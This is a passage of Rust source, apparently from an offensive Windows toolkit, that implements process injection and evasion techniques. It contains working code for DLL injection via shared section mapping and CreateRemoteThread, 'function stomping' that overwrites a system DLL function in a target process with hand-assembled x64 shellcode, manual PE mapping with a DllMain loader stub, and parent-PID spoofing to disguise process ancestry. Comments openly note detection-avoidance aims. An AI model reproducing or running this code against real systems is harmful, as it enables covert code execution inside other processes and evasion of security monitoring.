        return Err(MiscError::FileNotFound(dll_path.to_string()));
    }

    // Encode DLL path as wide string (UTF-16) with null terminator
    let wide_path: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_path_bytes = wide_path.len() * std::mem::size_of::<u16>();

    unsafe {
        // Open target process with required permissions
        let process_handle = OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION,
            false,
            pid,
        )
        .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Create an anonymous file mapping (backed by the page file, not a real file)
        let mapping_handle = CreateFileMappingW(
            INVALID_HANDLE_VALUE, // anonymous mapping
            None,                 // default security
            PAGE_READWRITE,       // section can be mapped as R/W
            0,                    // high-order size = 0
            wide_path_bytes as u32, // low-order size = DLL path length
            None,                 // unnamed
        )
        .map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::AllocFailed
        })?;

        // Map a writable view into our own process to copy the DLL path
        let local_view = MapViewOfFile(
            mapping_handle,
            FILE_MAP_WRITE,
            0,
            0,
            wide_path_bytes,
        );

        if local_view.Value.is_null() {
            let _ = CloseHandle(mapping_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::AllocFailed);
        }

        // Copy the DLL path into the local mapped view
        std::ptr::copy_nonoverlapping(
            wide_path.as_ptr() as *const u8,
            local_view.Value as *mut u8,
            wide_path_bytes,
        );

        // Unmap local view (writing is done)
        let _ = UnmapViewOfFile(local_view);

        // Map the same section into the remote process via NtMapViewOfSection.
        // This shares the file mapping — the remote view sees the DLL path we wrote.
        let mut remote_base: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut view_size: usize = 0; // 0 = map entire section

        let status = NtMapViewOfSection(
            mapping_handle.0 as *mut _,                   // section handle
            process_handle.0 as *mut _,                   // target process
            (&mut remote_base) as *mut _ as *mut *mut _,  // receives remote base address
            0,                                            // ZeroBits
            wide_path_bytes,                              // CommitSize
            std::ptr::null_mut(),                         // SectionOffset (start at 0)
            &mut view_size,                               // ViewSize (0 = entire section)
            2,                                            // ViewUnmap (not inherited by children)
            0,                                            // AllocationType
            0x04,                                         // PAGE_READWRITE
        );

        if status != 0 || remote_base.is_null() {
            let _ = CloseHandle(mapping_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::AllocFailed);
        }

        // Resolve LoadLibraryW address from kernel32.dll
        let kernel32_name = CString::new("kernel32.dll").unwrap();
        let kernel32 =
            GetModuleHandleA(PCSTR(kernel32_name.as_ptr() as *const u8)).map_err(|_| {
                let _ = CloseHandle(mapping_handle);
                let _ = CloseHandle(process_handle);
                MiscError::GetModuleHandleFailed
            })?;

        let load_library_name = CString::new("LoadLibraryW").unwrap();
        let load_library_addr =
            GetProcAddress(kernel32, PCSTR(load_library_name.as_ptr() as *const u8));

        let load_library_addr = match load_library_addr {
            Some(addr) => addr,
            None => {
                let _ = CloseHandle(mapping_handle);
                let _ = CloseHandle(process_handle);
                return Err(MiscError::GetProcAddressFailed);
            }
        };

        // Cast LoadLibraryW address to the thread start routine type
        let thread_start: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(load_library_addr);

        // Create a remote thread that calls LoadLibraryW with the mapped DLL path
        let thread_handle = CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(thread_start),
            Some(remote_base as *const _),
            0,
            None,
        )
        .map_err(|_| {
            let _ = CloseHandle(mapping_handle);
            let _ = CloseHandle(process_handle);
            MiscError::CreateRemoteThreadFailed
        })?;

        // Wait for the remote thread to finish (10 second timeout)
        let wait_result = WaitForSingleObject(thread_handle, 10_000);

        let _ = CloseHandle(thread_handle);
        // NOTE: Remote mapping stays in target process — small footprint (DLL path string only).
        // Closing mapping_handle is safe: the remote view holds its own section reference.
        let _ = CloseHandle(mapping_handle);
        let _ = CloseHandle(process_handle);

        if wait_result.0 != 0 {
            return Err(MiscError::Timeout);
        }

        Ok(())
    }
}

/// Inject a DLL into a target process using remote function stomping.
///
/// Loads a sacrificial DLL locally to resolve a target function address (identical in the
/// remote process due to shared ASLR base), then overwrites that function's code in the
/// remote process with shellcode that calls `LoadLibraryW(dll_path)`. Execution via
/// `CreateRemoteThread` on the stomped address avoids allocating new executable memory.
///
/// # Arguments
/// * `pid` - Target process PID
/// * `dll_path` - Path to the DLL to inject
/// * `sacrificial_dll` - Name of the DLL containing the function to stomp (e.g. "setupapi.dll")
/// * `sacrificial_func` - Name of the function to overwrite (e.g. "SetupScanFileQueueA")
///
/// # Safety
/// This function uses unsafe Windows API calls to manipulate another process.
pub fn inject_dll_function_stomping(
    pid: u32,
    dll_path: &str,
    sacrificial_dll: &str,
    sacrificial_func: &str,
) -> Result<(), MiscError> {
    // Validate DLL exists
    if !Path::new(dll_path).exists() {
        return Err(MiscError::FileNotFound(dll_path.to_string()));
    }

    // Encode DLL path as wide string (UTF-16) with null terminator
    let wide_path: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_path_bytes = wide_path.len() * std::mem::size_of::<u16>();

    unsafe {
        // Open target process with required permissions
        let process_handle = OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            false,
            pid,
        )
        .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Load the sacrificial DLL in our own process to resolve the function address.
        // System DLLs share the same base address across processes (ASLR is per-boot),
        // so the address we get locally is valid in the remote process too.
        let sac_dll_cstr = CString::new(sacrificial_dll).unwrap();
        let sac_module =
            LoadLibraryA(PCSTR(sac_dll_cstr.as_ptr() as *const u8)).map_err(|_| {
                let _ = CloseHandle(process_handle);
                MiscError::GetModuleHandleFailed
            })?;

        let sac_func_cstr = CString::new(sacrificial_func).unwrap();
        let sac_func_addr = GetProcAddress(
            sac_module,
            PCSTR(sac_func_cstr.as_ptr() as *const u8),
        );

        let sac_func_addr = match sac_func_addr {
            Some(addr) => addr as usize,
            None => {
                let _ = CloseHandle(process_handle);
                return Err(MiscError::GetProcAddressFailed);
            }
        };

        // Resolve LoadLibraryW address for the shellcode
        let kernel32_name = CString::new("kernel32.dll").unwrap();
        let kernel32 =
            GetModuleHandleA(PCSTR(kernel32_name.as_ptr() as *const u8)).map_err(|_| {
                let _ = CloseHandle(process_handle);
                MiscError::GetModuleHandleFailed
            })?;

        let load_library_name = CString::new("LoadLibraryW").unwrap();
        let load_library_addr =
            GetProcAddress(kernel32, PCSTR(load_library_name.as_ptr() as *const u8));

        let load_library_addr = match load_library_addr {
            Some(addr) => addr as usize,
            None => {
                let _ = CloseHandle(process_handle);
                return Err(MiscError::GetProcAddressFailed);
            }
        };

        // Build x64 shellcode that calls LoadLibraryW with the embedded DLL path.
        // Layout: [shellcode 28 bytes] [DLL path UTF-16]
        //
        //   sub rsp, 0x28               ; shadow space + alignment
        //   lea rcx, [rip + 0x11]       ; rcx = &dll_path (17 bytes ahead)
        //   mov rax, <LoadLibraryW>     ; absolute address
        //   call rax
        //   add rsp, 0x28
        //   ret
        //   <dll_path UTF-16 bytes>
        let mut payload: Vec<u8> = Vec::with_capacity(28 + wide_path_bytes);

        // sub rsp, 0x28
        payload.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
        // lea rcx, [rip + 0x11] — 17 bytes from end of this instruction to DLL path
        payload.extend_from_slice(&[0x48, 0x8D, 0x0D, 0x11, 0x00, 0x00, 0x00]);
        // mov rax, imm64 (LoadLibraryW address)
        payload.push(0x48);
        payload.push(0xB8);
        payload.extend_from_slice(&(load_library_addr as u64).to_le_bytes());
        // call rax
        payload.extend_from_slice(&[0xFF, 0xD0]);
        // add rsp, 0x28
        payload.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
        // ret
        payload.push(0xC3);
        // DLL path (UTF-16) appended right after shellcode
        let path_bytes: &[u8] =
            std::slice::from_raw_parts(wide_path.as_ptr() as *const u8, wide_path_bytes);
        payload.extend_from_slice(path_bytes);

        let total_size = payload.len();

        // Change protection of the sacrificial function region to writable
        let mut old_protection = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            process_handle,
            sac_func_addr as *const _,
            total_size,
            PAGE_READWRITE,
            &mut old_protection,
        )
        .map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::WriteFailed
        })?;

        // Overwrite the sacrificial function with our shellcode + DLL path
        WriteProcessMemory(
            process_handle,
            sac_func_addr as *mut _,
            payload.as_ptr() as *const _,
            total_size,
            None,
        )
        .map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::WriteFailed
        })?;

        // Restore execute permission so the stomped function can run
        VirtualProtectEx(
            process_handle,
            sac_func_addr as *const _,
            total_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protection,
        )
        .map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::WriteFailed
        })?;

        // Execute the stomped function via CreateRemoteThread
        let thread_start: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(sac_func_addr);

        let thread_handle = CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(thread_start),
            None,
            0,
            None,
        )
        .map_err(|_| {
            let _ = CloseHandle(process_handle);
            MiscError::CreateRemoteThreadFailed
        })?;

        // Wait for the remote thread to finish (10 second timeout)
        let wait_result = WaitForSingleObject(thread_handle, 10_000);

        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        if wait_result.0 != 0 {
            return Err(MiscError::Timeout);
        }

        Ok(())
    }
}

/// Inject a DLL into a target process using manual mapping.
///
/// Reads the DLL file, maps it into the target process manually (sections, relocations,
/// imports), then executes DllMain via a remote thread.
///
/// # Safety
/// This function uses unsafe Windows API calls to manipulate another process's memory.
pub fn inject_dll_manual_map(pid: u32, dll_path: &str) -> Result<(), MiscError> {
    // Validate and read DLL file
    if !Path::new(dll_path).exists() {
        return Err(MiscError::FileNotFound(dll_path.to_string()));
    }

    let data =
        std::fs::read(dll_path).map_err(|_| MiscError::FileReadFailed(dll_path.to_string()))?;

    // Parse DOS header
    if data.len() < 64 {
        return Err(MiscError::InvalidPE("File too small for DOS header".into()));
    }
    let dos_magic = u16::from_le_bytes([data[0], data[1]]);
    if dos_magic != 0x5A4D {
        return Err(MiscError::InvalidPE("Invalid DOS magic (not MZ)".into()));
    }
    let pe_offset = u32::from_le_bytes([data[60], data[61], data[62], data[63]]) as usize;

    // Parse PE signature
    if data.len() < pe_offset + 4 {
        return Err(MiscError::InvalidPE(
            "File too small for PE signature".into(),
        ));
    }
    let pe_sig = u32::from_le_bytes([
        data[pe_offset],
        data[pe_offset + 1],
        data[pe_offset + 2],
        data[pe_offset + 3],
    ]);
    if pe_sig != 0x00004550 {
        return Err(MiscError::InvalidPE("Invalid PE signature".into()));
    }

    // COFF header
    let coff_offset = pe_offset + 4;
    if data.len() < coff_offset + 20 {
        return Err(MiscError::InvalidPE(
            "File too small for COFF header".into(),
        ));
    }
    let num_sections = u16::from_le_bytes([data[coff_offset + 2], data[coff_offset + 3]]) as usize;
    let optional_header_size =
        u16::from_le_bytes([data[coff_offset + 16], data[coff_offset + 17]]) as usize;

    // Optional header
    let opt_offset = coff_offset + 20;
    if data.len() < opt_offset + 2 {
        return Err(MiscError::InvalidPE(
            "File too small for optional header".into(),
        ));
    }
    let opt_magic = u16::from_le_bytes([data[opt_offset], data[opt_offset + 1]]);
    if opt_magic != 0x20b {
        return Err(MiscError::InvalidPE(
            "Only PE32+ (64-bit) DLLs are supported".into(),
        ));
    }

    // PE32+ optional header fields
    if data.len() < opt_offset + 112 {
        return Err(MiscError::InvalidPE("Optional header too small".into()));
    }

    let entry_point_rva = u32::from_le_bytes([
        data[opt_offset + 16],
        data[opt_offset + 17],
        data[opt_offset + 18],
        data[opt_offset + 19],
    ]) as usize;

    let image_base = u64::from_le_bytes([
        data[opt_offset + 24],
        data[opt_offset + 25],
        data[opt_offset + 26],
        data[opt_offset + 27],
        data[opt_offset + 28],
        data[opt_offset + 29],
        data[opt_offset + 30],
        data[opt_offset + 31],
    ]);

    let size_of_image = u32::from_le_bytes([
        data[opt_offset + 56],
        data[opt_offset + 57],
        data[opt_offset + 58],
        data[opt_offset + 59],
    ]) as usize;

    let size_of_headers = u32::from_le_bytes([
        data[opt_offset + 60],
        data[opt_offset + 61],
        data[opt_offset + 62],
        data[opt_offset + 63],
    ]) as usize;

    // Data directories (PE32+: start at opt_offset + 112)
    // Import directory: index 1 (offset 112 + 1*8 = 120)
    let import_dir_rva;
    let import_dir_size;
    if data.len() >= opt_offset + 128 {
        import_dir_rva = u32::from_le_bytes([
            data[opt_offset + 120],
            data[opt_offset + 121],
            data[opt_offset + 122],
            data[opt_offset + 123],
        ]) as usize;
        import_dir_size = u32::from_le_bytes([
            data[opt_offset + 124],
            data[opt_offset + 125],
            data[opt_offset + 126],
            data[opt_offset + 127],
        ]) as usize;
    } else {
        import_dir_rva = 0;
        import_dir_size = 0;
    }

    // Base relocation directory: index 5 (offset 112 + 5*8 = 152)
    let reloc_dir_rva;
    let reloc_dir_size;
    if data.len() >= opt_offset + 160 {
        reloc_dir_rva = u32::from_le_bytes([
            data[opt_offset + 152],
            data[opt_offset + 153],
            data[opt_offset + 154],
            data[opt_offset + 155],
        ]) as usize;
        reloc_dir_size = u32::from_le_bytes([
            data[opt_offset + 156],
            data[opt_offset + 157],
            data[opt_offset + 158],
            data[opt_offset + 159],
        ]) as usize;
    } else {
        reloc_dir_rva = 0;
        reloc_dir_size = 0;
    }

    // Parse section headers
    let sections_offset = opt_offset + optional_header_size;

    #[allow(dead_code)]
    struct SectionInfo {
        virtual_address: usize,
        virtual_size: usize,
        raw_data_offset: usize,
        raw_data_size: usize,
    }

    let mut sections = Vec::new();
    for i in 0..num_sections {
        let s_off = sections_offset + i * 40;
        if data.len() < s_off + 40 {
            break;
        }
        let virtual_size = u32::from_le_bytes([
            data[s_off + 8],
            data[s_off + 9],
            data[s_off + 10],
            data[s_off + 11],
        ]) as usize;
        let virtual_address = u32::from_le_bytes([
            data[s_off + 12],
            data[s_off + 13],
            data[s_off + 14],
            data[s_off + 15],
        ]) as usize;
        let raw_data_size = u32::from_le_bytes([
            data[s_off + 16],
            data[s_off + 17],
            data[s_off + 18],
            data[s_off + 19],
        ]) as usize;
        let raw_data_offset = u32::from_le_bytes([
            data[s_off + 20],
            data[s_off + 21],
            data[s_off + 22],
            data[s_off + 23],
        ]) as usize;
        sections.push(SectionInfo {
            virtual_address,
            virtual_size,
            raw_data_offset,
            raw_data_size,
        });
    }

    // Build local image buffer
    let mut image = vec![0u8; size_of_image];

    // Copy PE headers
    let header_copy_len = size_of_headers.min(data.len()).min(size_of_image);
    image[..header_copy_len].copy_from_slice(&data[..header_copy_len]);

    // Map each section
    for section in &sections {
        if section.raw_data_size == 0 || section.raw_data_offset == 0 {
            continue;
        }
        let src_start = section.raw_data_offset;
        let src_end = (src_start + section.raw_data_size).min(data.len());
        let dst_start = section.virtual_address;
        let copy_len = (src_end - src_start).min(size_of_image.saturating_sub(dst_start));
        if copy_len > 0 && dst_start < size_of_image {
            image[dst_start..dst_start + copy_len]
                .copy_from_slice(&data[src_start..src_start + copy_len]);
        }
    }

    unsafe {
        // Open target process
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Allocate remote memory for the full image
        let remote_base = VirtualAllocEx(
            process_handle,
            Some(std::ptr::null()),
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_base.is_null() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::AllocFailed);
        }

        let actual_base = remote_base as u64;
        let delta = actual_base.wrapping_sub(image_base) as i64;

        // Process base relocations
        if reloc_dir_rva != 0 && reloc_dir_size != 0 && delta != 0 {
            let mut reloc_offset = reloc_dir_rva;
            let reloc_end = reloc_dir_rva + reloc_dir_size;

            while reloc_offset + 8 <= reloc_end && reloc_offset + 8 <= size_of_image {
                let block_rva = u32::from_le_bytes([
                    image[reloc_offset],
                    image[reloc_offset + 1],
                    image[reloc_offset + 2],
                    image[reloc_offset + 3],
                ]) as usize;
                let block_size = u32::from_le_bytes([
                    image[reloc_offset + 4],
                    image[reloc_offset + 5],
                    image[reloc_offset + 6],
                    image[reloc_offset + 7],
                ]) as usize;

                if block_size < 8 {
                    break;
                }

                let num_entries = (block_size - 8) / 2;
                for i in 0..num_entries {
                    let entry_offset = reloc_offset + 8 + i * 2;
                    if entry_offset + 2 > size_of_image {
                        break;
                    }
                    let entry = u16::from_le_bytes([image[entry_offset], image[entry_offset + 1]]);
                    let reloc_type = (entry >> 12) as u8;
                    let offset = (entry & 0x0FFF) as usize;
                    let target = block_rva + offset;

                    match reloc_type {
                        10 => {
                            // IMAGE_REL_BASED_DIR64
                            if target + 8 <= size_of_image {
                                let val = u64::from_le_bytes([
                                    image[target],
                                    image[target + 1],
                                    image[target + 2],
                                    image[target + 3],
                                    image[target + 4],
                                    image[target + 5],
                                    image[target + 6],
                                    image[target + 7],
                                ]);
                                let new_val = (val as i64).wrapping_add(delta) as u64;
                                image[target..target + 8].copy_from_slice(&new_val.to_le_bytes());
                            }
                        }
                        3 => {
                            // IMAGE_REL_BASED_HIGHLOW
                            if target + 4 <= size_of_image {
                                let val = u32::from_le_bytes([
                                    image[target],
                                    image[target + 1],
                                    image[target + 2],
                                    image[target + 3],
                                ]);
                                let new_val = (val as i32).wrapping_add(delta as i32) as u32;
                                image[target..target + 4].copy_from_slice(&new_val.to_le_bytes());
                            }
                        }
                        0 => {} // IMAGE_REL_BASED_ABSOLUTE - padding, skip
                        _ => {}
                    }
                }

                reloc_offset += block_size;
            }
        }

        // Resolve imports
        if import_dir_rva != 0 && import_dir_size != 0 {
            let mut desc_offset = import_dir_rva;
            loop {
                if desc_offset + 20 > size_of_image {
                    break;
                }

                let ilt_rva = u32::from_le_bytes([
                    image[desc_offset],
                    image[desc_offset + 1],
                    image[desc_offset + 2],
                    image[desc_offset + 3],
                ]) as usize;
                let name_rva = u32::from_le_bytes([
                    image[desc_offset + 12],
                    image[desc_offset + 13],
                    image[desc_offset + 14],
                    image[desc_offset + 15],
                ]) as usize;
                let iat_rva = u32::from_le_bytes([
                    image[desc_offset + 16],
                    image[desc_offset + 17],
                    image[desc_offset + 18],
                    image[desc_offset + 19],
                ]) as usize;

                // Null descriptor terminates the list
                if name_rva == 0 && ilt_rva == 0 {
                    break;
                }

                // Read DLL name from image buffer
                let dll_name = read_cstring_from_buf(&image, name_rva);
                let dll_cname = CString::new(dll_name.as_str()).unwrap_or_default();

                let module = GetModuleHandleA(PCSTR(dll_cname.as_ptr() as *const u8));
                let module = match module {
                    Ok(m) => m,
                    Err(_) => {
                        // Skip DLLs we can't resolve locally
                        desc_offset += 20;
                        continue;
                    }
                };

                // Walk the ILT (or IAT if ILT is 0)
                let thunk_rva = if ilt_rva != 0 { ilt_rva } else { iat_rva };
                let mut thunk_off = thunk_rva;
                let mut iat_off = iat_rva;

                loop {
                    if thunk_off + 8 > size_of_image || iat_off + 8 > size_of_image {
                        break;
                    }

                    let thunk_value = u64::from_le_bytes([
                        image[thunk_off],
                        image[thunk_off + 1],
                        image[thunk_off + 2],
                        image[thunk_off + 3],
                        image[thunk_off + 4],
                        image[thunk_off + 5],
                        image[thunk_off + 6],
                        image[thunk_off + 7],
                    ]);

                    if thunk_value == 0 {
                        break;
                    }

                    let func_addr: u64;

                    // Check ordinal flag (bit 63 for PE32+)
                    if thunk_value & (1u64 << 63) != 0 {
                        let ordinal = (thunk_value & 0xFFFF) as u16;
                        let addr = GetProcAddress(module, PCSTR(ordinal as usize as *const u8));
                        func_addr = match addr {
                            Some(a) => a as usize as u64,
                            None => 0,
                        };
                    } else {
                        // Hint/Name: 2-byte hint + name string
                        let hint_name_rva = (thunk_value & 0x7FFFFFFF) as usize;
                        if hint_name_rva + 2 < size_of_image {
                            let func_name = read_cstring_from_buf(&image, hint_name_rva + 2);
                            let func_cname = CString::new(func_name.as_str()).unwrap_or_default();
                            let addr =
                                GetProcAddress(module, PCSTR(func_cname.as_ptr() as *const u8));
                            func_addr = match addr {
                                Some(a) => a as usize as u64,
                                None => 0,
                            };
                        } else {
                            func_addr = 0;
                        }
                    }

                    // Write resolved address to the IAT in our local buffer
                    image[iat_off..iat_off + 8].copy_from_slice(&func_addr.to_le_bytes());

                    thunk_off += 8;
                    iat_off += 8;
                }

                desc_offset += 20;
            }
        }

        // Write the processed image to remote memory
        if WriteProcessMemory(
            process_handle,
            remote_base,
            image.as_ptr() as *const _,
            size_of_image,
            None,
        )
        .is_err()
        {
            let _ = VirtualFreeEx(process_handle, remote_base, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Build DllMain loader shellcode
        let entry_addr = actual_base + entry_point_rva as u64;
        let mut shellcode: Vec<u8> = Vec::new();

        // sub rsp, 0x28 (shadow space + alignment)
        shellcode.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);

        // mov rcx, <remote_base> (hModule = DLL base)
        shellcode.extend_from_slice(&[0x48, 0xB9]);
        shellcode.extend_from_slice(&actual_base.to_le_bytes());

        // mov rdx, 1 (DLL_PROCESS_ATTACH)
        shellcode.extend_from_slice(&[0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00]);

        // xor r8, r8 (lpvReserved = NULL)
        shellcode.extend_from_slice(&[0x4D, 0x31, 0xC0]);

        // mov rax, <entry_point>
        shellcode.extend_from_slice(&[0x48, 0xB8]);
        shellcode.extend_from_slice(&entry_addr.to_le_bytes());

        // call rax
        shellcode.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x28
        shellcode.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);

        // ret
        shellcode.push(0xC3);

        // Allocate + write shellcode to separate remote memory
        let shellcode_mem = VirtualAllocEx(
            process_handle,
            Some(std::ptr::null()),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if shellcode_mem.is_null() {
            // Don't free remote_base - image memory must stay for DLL
            let _ = CloseHandle(process_handle);
            return Err(MiscError::AllocFailed);
        }

        if WriteProcessMemory(
            process_handle,
            shellcode_mem,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            None,
        )
        .is_err()
        {
            let _ = VirtualFreeEx(process_handle, shellcode_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Create remote thread to execute shellcode (calls DllMain)
        let thread_start: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(shellcode_mem);

        let thread_handle =
            CreateRemoteThread(process_handle, None, 0, Some(thread_start), None, 0, None)
                .map_err(|_| {
                    let _ = VirtualFreeEx(process_handle, shellcode_mem, 0, MEM_RELEASE);
                    let _ = CloseHandle(process_handle);
                    MiscError::CreateRemoteThreadFailed
                })?;

        // Wait for DllMain to finish (10s timeout)
        let wait_result = WaitForSingleObject(thread_handle, 10_000);

        let _ = CloseHandle(thread_handle);
        // Free shellcode memory (no longer needed after DllMain returns)
        let _ = VirtualFreeEx(process_handle, shellcode_mem, 0, MEM_RELEASE);
        // NOTE: remote_base (image memory) stays allocated - required for DLL to function
        let _ = CloseHandle(process_handle);

        if wait_result.0 != 0 {
            return Err(MiscError::Timeout);
        }

        Ok(())
    }
}

/// Read a null-terminated C string from a byte buffer at a given offset.
fn read_cstring_from_buf(data: &[u8], offset: usize) -> String {
    let mut end = offset;
    while end < data.len() && data[end] != 0 {
        end += 1;
    }
    String::from_utf8_lossy(&data[offset..end]).to_string()
}

/// Commit a reserved memory region in a target process.
pub fn commit_memory(pid: u32, address: usize, size: usize) -> Result<(), MiscError> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_VM_OPERATION, false, pid)
            .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        let result = VirtualAllocEx(
            process_handle,
            Some(address as *const _),
            size,
            MEM_COMMIT,
            PAGE_READWRITE,
        );

        let _ = CloseHandle(process_handle);

        if result.is_null() {
            return Err(MiscError::CommitFailed(format!(
                "VirtualAllocEx failed at 0x{:X}",
                address
            )));
        }

        Ok(())
    }
}

/// Decommit a committed memory region in a target process.
pub fn decommit_memory(pid: u32, address: usize, size: usize) -> Result<(), MiscError> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_VM_OPERATION, false, pid)
            .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        let result = VirtualFreeEx(process_handle, address as *mut _, size, MEM_DECOMMIT);

        let _ = CloseHandle(process_handle);

        result.map_err(|e| {
            MiscError::DecommitFailed(format!("VirtualFreeEx failed at 0x{:X}: {}", address, e))
        })
    }
}

/// Free an entire allocation in a target process (uses allocation_base, size must be 0).
pub fn free_memory(pid: u32, allocation_base: usize) -> Result<(), MiscError> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_VM_OPERATION, false, pid)
            .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        let result = VirtualFreeEx(process_handle, allocation_base as *mut _, 0, MEM_RELEASE);

        let _ = CloseHandle(process_handle);

        result.map_err(|e| {
            MiscError::FreeFailed(format!(
                "VirtualFreeEx failed at 0x{:X}: {}",
                allocation_base, e
            ))
        })
    }
}

/// Create a new process using CreateProcessW.
///
/// Returns (pid, thread_id) on success.
///
/// # Arguments
/// * `exe_path` - Path to the executable
/// * `args` - Command line arguments (can be empty)
/// * `suspended` - If true, creates the process in a suspended state
pub fn create_process(exe_path: &str, args: &str, suspended: bool) -> Result<(u32, u32), MiscError> {
    // Validate executable exists
    if !Path::new(exe_path).exists() {
        return Err(MiscError::FileNotFound(exe_path.to_string()));
    }

    // Build command line: "exe_path" args
    let cmd_line = if args.is_empty() {
        format!("\"{}\"", exe_path)
    } else {
        format!("\"{}\" {}", exe_path, args)
    };

    // Convert to wide string (UTF-16)
    let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        let creation_flags = if suspended { CREATE_SUSPENDED } else { Default::default() };

        let result = CreateProcessW(
            None,                           // lpApplicationName
            windows::core::PWSTR(cmd_wide.as_mut_ptr()), // lpCommandLine
            None,                           // lpProcessAttributes
            None,                           // lpThreadAttributes
            false,                          // bInheritHandles
            creation_flags,                 // dwCreationFlags
            None,                           // lpEnvironment
            None,                           // lpCurrentDirectory
            &startup_info,                  // lpStartupInfo
            &mut process_info,              // lpProcessInformation
        );

        if result.is_err() {
            return Err(MiscError::CreateProcessFailed(format!(
                "CreateProcessW failed for {}",
                exe_path
            )));
        }

        let pid = process_info.dwProcessId;
        let tid = process_info.dwThreadId;

        // Close handles (we don't need them)
        let _ = CloseHandle(process_info.hThread);
        let _ = CloseHandle(process_info.hProcess);

        Ok((pid, tid))
    }
}

/// Create a process with a spoofed parent PID (PPID Spoofing).
///
/// Uses `InitializeProcThreadAttributeList` + `UpdateProcThreadAttribute` with
/// `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to make the new process appear as a child
/// of the specified parent process, then calls `CreateProcessW` with
/// `EXTENDED_STARTUPINFO_PRESENT`.
///
/// # Arguments
/// * `parent_pid` - PID of the process to use as the spoofed parent
/// * `exe_path` - Path to the executable to launch
/// * `args` - Command line arguments (can be empty)
/// * `suspended` - Whether to create the process in a suspended state
pub fn create_ppid_spoofed_process(
    parent_pid: u32,
    exe_path: &str,
    args: &str,
    suspended: bool,
) -> Result<(u32, u32), MiscError> {
    const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;

    // Validate executable exists
    if !Path::new(exe_path).exists() {
        return Err(MiscError::FileNotFound(exe_path.to_string()));
    }

    // Build command line: "exe_path" args
    let cmd_line = if args.is_empty() {
        format!("\"{}\"", exe_path)
    } else {
        format!("\"{}\" {}", exe_path, args)
    };

    let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        // Open handle to the parent process
        let h_parent = OpenProcess(PROCESS_ALL_ACCESS, false, parent_pid)
            .map_err(|_| MiscError::OpenProcessFailed(parent_pid))?;

        // First call to get required attribute list size
        let mut attr_size: usize = 0;
        let _ = InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST(std::ptr::null_mut()),
            1,
            0,
            &mut attr_size,
        );

        if attr_size == 0 {
            let _ = CloseHandle(h_parent);
            return Err(MiscError::PPidSpoofFailed(
                "InitializeProcThreadAttributeList returned zero size".to_string(),
            ));
        }

        // Allocate buffer for attribute list
        let mut attr_buf = vec![0u8; attr_size];
        let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(attr_buf.as_mut_ptr() as *mut _);

        // Initialize the attribute list
        if InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size).is_err() {
            let _ = CloseHandle(h_parent);
            return Err(MiscError::PPidSpoofFailed(
                "InitializeProcThreadAttributeList failed".to_string(),
            ));
        }

        // Set the parent process attribute
        let h_parent_raw = h_parent.0 as *mut std::ffi::c_void;
        if UpdateProcThreadAttribute(
            attr_list,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            Some(&h_parent_raw as *const _ as *const std::ffi::c_void),
            std::mem::size_of::<*mut std::ffi::c_void>(),
            None,
            None,
        )
        .is_err()
        {
            DeleteProcThreadAttributeList(attr_list);
            let _ = CloseHandle(h_parent);
            return Err(MiscError::PPidSpoofFailed(
